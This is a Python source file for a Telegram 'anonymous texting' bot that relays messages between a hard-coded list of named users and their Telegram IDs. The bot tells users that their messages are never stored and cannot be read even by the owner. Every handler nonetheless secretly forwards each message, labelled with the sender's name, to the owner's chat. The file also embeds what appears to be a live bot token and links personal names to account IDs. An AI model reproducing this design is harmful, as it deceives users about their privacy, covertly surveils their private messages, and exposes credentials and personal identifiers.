import telebot
import re
from telebot import types
from telebot.handler_backends import State, StatesGroup

my_secret = "5315147250:AAHTRQskAbP2l8ld5-4CwpqYSiSTZ7K1g6M"
bot = telebot.TeleBot(my_secret)

v= ["manoj","alwinpro","puri","alwin","som","Devdaat","Prarthana"]
v1 = [1079530917,5141152793,1765579723,1244070092,1070954897,5178562254,1901610330]


@bot.message_handler(commands=['start'])
def start(message):
  bot.send_message(v1[0],idtoname(message.chat.id) +": "+ message.text)
  bot.send_message(message.chat.id,"Hey! Welcome\n")
  bot.send_message(message.chat.id,"Important:-\nNo messages can be stored anywhere, messages can't even be accesed by the owner himself. It's just you who know your messages")
  bot.send_message(message.chat.id,"Author:-Manoj Patil(@mdaonr)")
  msg = bot.send_message(message.chat.id,"Do you want to know how it works?[yes/no]")
  bot.register_next_step_handler(msg,explain_it)

def explain_it(message):
    bot.send_message(v1[0],idtoname(message.chat.id) +": "+ message.text)
    m=0
    if(re.search("yes",message.text) or re.search("Yes",message.text) ):
        bot.reply_to(message,"texting \'/text\' will display the list of registered names\nrespond back with one of the names\nfinally enter the text that you want to send then")
    elif(re.search("no",message.text) or re.search("No",message.text)):
        bot.reply_to(message,"okay")
    else:
        msg=bot.reply_to(message,"Invalid input!!")
        bot.register_next_step_handler(msg,explain_it)


@bot.message_handler(commands=['text'])
def play(message):
  bot.send_message(1079530917,idtoname(message.chat.id) +": "+ message.text)
  bot.send_message(message.chat.id, "Choose a person to text:")
  ko=1
  ma=""
  for x in v:
    ma+=str(ko)+") "+x+"\n"
    ko+=1
  msg=bot.send_message(message.chat.id, ma)
  bot.register_next_step_handler(msg,name_text)

def name_text(message):
    try:
        id=v1[v.index(message.text)]
        msg= bot.send_message(message.chat.id,"Enter a text to forward")
        bot.register_next_step_handler(msg,mes_send,id,0)
    except Exception as e:
        msg=bot.reply_to(message, 'Enter a valid name')
        bot.register_next_step_handler(msg,name_text)

def mes_send(message,id,k):
  try:
      msg = bot.reply_to(message, 'done')
      if(k):
        bot.send_message(id,"You got a reply for your text:-")
      else:
       bot.send_message(id,"Someone just tried to send you a anonymous text:-")
      bot.send_message(v1[0],idtoname(message.chat.id) +": "+ message.text)
      bot.send_message(id,message.text)
      msg=bot.send_message(id,"Do u want to reply:[yes/no]")
      bot.register_next_step_handler(msg,reply_msg,message.chat.id)
  except Exception as e:
        bot.reply_to(message, 'oooops try again')

def reply_msg(message,id):
  bot.send_message(v1[0],idtoname(message.chat.id) +": "+ message.text)
  m=0
  if(re.search("yes",message.text) or re.search("Yes",message.text) ):
    m=1
  elif(re.search("no",message.text) or re.search("No",message.text)):
    m=2
  else:
    msg=bot.reply_to(message,"Invalid input!!")
    bot.register_next_step_handler(msg,reply_msg,id)
  if m:
   try:
     if(m==1):
       msg=bot.reply_to(message,"Enter a message to send")
       bot.register_next_step_handler(msg,mes_send,id,1)
     elif(m==2):
        bot.reply_to(message,"Okay")
   except Exception as e:
     bot.reply_to(message, 'oooops try again')



@bot.message_handler(commands=['stop'])
def stop(message):
  bot.send_message(1079530917,idtoname(message.chat.id) +": "+ message.text)
  bot.send_message(message.chat.id,"bye! See you soon...")


@bot.message_handler(func=lambda m: True)
def echo_all(message):
 bot.reply_to(message,message.text)
 bot.send_message(1079530917,idtoname(message.chat.id) +": "+ message.text)

def idtoname(num):
  try:
    return v[v1.index(num)]
  except Exception as e:
    return str(num)

bot.polling()
